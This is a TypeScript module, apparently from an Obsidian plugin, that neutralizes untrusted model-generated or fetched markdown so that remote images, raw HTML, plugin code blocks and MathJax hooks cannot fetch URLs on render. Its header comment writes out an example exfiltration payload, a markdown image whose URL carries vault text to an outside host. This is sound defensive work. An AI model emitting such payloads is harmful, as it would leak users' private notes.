/**
 * Model and fetched text is untrusted. Rendered as markdown, a remote
 * image (`![](https://host/?d=<vault text>)`) or raw HTML (`<img>`,
 * `<iframe>`, a `style` with `url()`) makes Obsidian fetch that URL the
 * moment it renders, which leaks whatever the model put in it. A DOM
 * sweep after rendering is too late: an <img> starts loading as soon as
 * its src is set. So the text is neutralized before it reaches the
 * renderer, with a zero-width space that is invisible in prose and in
 * code blocks:
 *
 * - `<` before a letter, `/`, `!` or `?` gets one, so neither the
 *   markdown parser nor the browser's HTML tokenizer can open a tag or
 *   an HTML block. Autolinks (`<https://…>`) render as links and stay.
 * - `![` gets one unless the image provably points inside the vault: a
 *   `![[wikilink]]` embed, or an inline `![alt](target)` whose target has
 *   no scheme, no leading `//` and nothing an entity or escape could turn
 *   into one. A remote image becomes a plain link.
 * - A code fence's language gets one unless it is a plain highlighting
 *   language. Mermaid, Dataview and any plugin's code-block processor
 *   run on render and can fetch; the block shows as plain code instead.
 *   An inline code span opening with a Dataview query prefix (`=`, `$=`)
 *   gets one for the same reason.
 * - In math, `\style`, `\class`, `\cssId` and `\require` get one after
 *   the backslash: MathJax would apply CSS (`url()`) or load a module.
 *
 * Idempotent: a marked trigger is no longer followed by what fires it.
 */

export const ZWSP = '\u200b';

const AUTOLINK = /<[A-Za-z][A-Za-z0-9+.-]{1,31}:[^\s<>]*>/y;
const TAG_START = /[A-Za-z/!?]/;
const CODE_RUN = /(`+|~{3,})[ \t]*/y;
const MATH_HOOK = /(?:style|class|cssId|require)(?![A-Za-z])/y;
/** Fence languages no core or common plugin renders as anything but code. */
const HIGHLIGHT_ONLY = new Set(
  (
    'bash sh shell zsh fish console powershell ps1 bat cmd ' +
    'c h cpp hpp c++ cs csharp java kotlin kt scala go rust rs swift objc ' +
    'js javascript jsx mjs cjs ts typescript tsx json jsonc json5 yaml yml ' +
    'toml ini xml html css scss sass less vue svelte ' +
    'py python rb ruby php perl pl lua r julia dart elixir ex erlang ' +
    'haskell hs clojure clj ocaml fsharp nim zig ' +
    'sql graphql gql diff patch dockerfile makefile cmake nginx ' +
    'nix hcl terraform tf proto protobuf regex csv text txt plaintext md markdown'
  ).split(' '),
);
/** Longest alt text or embed target inspected before giving up. */
const SCAN_LIMIT = 2000;

export function neutralizeRemoteMedia(md: string): string {
  let out = '';
  for (let i = 0; i < md.length; i++) {
    const c = md[i];
    out += c;
    if (c === '<' && TAG_START.test(md[i + 1] ?? '')) {
      AUTOLINK.lastIndex = i;
      if (!AUTOLINK.test(md)) out += ZWSP;
    } else if (c === '!' && md[i + 1] === '[' && !isVaultImage(md, i + 1)) {
      out += ZWSP;
    } else if (c === '\\') {
      MATH_HOOK.lastIndex = i + 1;
      if (MATH_HOOK.test(md)) out += ZWSP;
    } else if ((c === '`' || c === '~') && md[i - 1] !== c) {
      CODE_RUN.lastIndex = i;
      const run = CODE_RUN.exec(md);
      if (!run) continue;
      out += run[0].slice(1);
      i += run[0].length - 1;
      if (runsOnRender(run[1].length, md.slice(i + 1, i + 65))) out += ZWSP;
    }
  }
  return out;
}

/** Whether the code opened by a run of `fence` backticks or tildes,
 * followed by `rest`, would be handed to a renderer other than plain code. */
function runsOnRender(fence: number, rest: string): boolean {
  if (/^\$?=/.test(rest)) return true;
  if (fence < 3) return false;
  const lang = /^[^\s`]+/.exec(rest)?.[0];
  return lang !== undefined && !lang.startsWith(ZWSP) &&
    !HIGHLIGHT_ONLY.has(lang);
}

/** Undo neutralizeRemoteMedia, for text read back from a saved note. */
export function restoreRemoteMedia(md: string): string {
  return md
    .replace(/<\u200b(?=[A-Za-z/!?])/g, '<')
    .replace(/!\u200b(?=\[)/g, '!')
    .replace(/((?:`+|~{3,})[ \t]*)\u200b/g, '$1')
    .replace(/\\\u200b(?=(?:style|class|cssId|require)(?![A-Za-z]))/g, '\\');
}

/** `open` indexes the `[` after `!`. */
function isVaultImage(md: string, open: number): boolean {
  if (md[open + 1] === '[') {
    const end = md.indexOf(']]', open + 2);
    if (end < 0 || end - open > SCAN_LIMIT) return false;
    // `![[a]](url)` is a CommonMark image with alt "[a]".
    if (md[end + 2] === '(' || md[end + 2] === '[') return false;
    const inner = md.slice(open + 2, end);
    if (/[[\]\n]/.test(inner)) return false;
    return isVaultTarget(inner.split(/[#|^]/)[0], true);
  }
  let depth = 0;
  let k = open;
  for (; k < md.length && k - open < SCAN_LIMIT; k++) {
    const ch = md[k];
    if (ch === '\\') {
      k++;
      continue;
    }
    // Code spans and tags take precedence over brackets; don't guess.
    if (ch === '`' || ch === '<') return false;
    if (ch === '[') depth++;
    else if (ch === ']' && --depth === 0) break;
  }
  if (depth !== 0 || md[k + 1] !== '(') return false;
  let p = k + 2;
  while (p < md.length && /[ \t\r\n]/.test(md[p])) p++;
  let target: string;
  if (md[p] === '<') {
    const close = md.indexOf('>', p);
    if (close < 0) return false;
    target = md.slice(p + 1, close);
  } else {
    target = /^[^ \t\r\n]*/.exec(md.slice(p, p + SCAN_LIMIT))?.[0] ?? '';
  }
  return isVaultTarget(target, false);
}

function isVaultTarget(target: string, spacesAllowed: boolean): boolean {
  if (!target || target.startsWith('//')) return false;
  for (const ch of target) {
    const c = ch.charCodeAt(0);
    if (c <= 0x1f || c === 0x7f || ch === ':' || ch === '&' || ch === '\\') return false;
    if (!spacesAllowed && /\s/.test(ch)) return false;
  }
  return true;
}
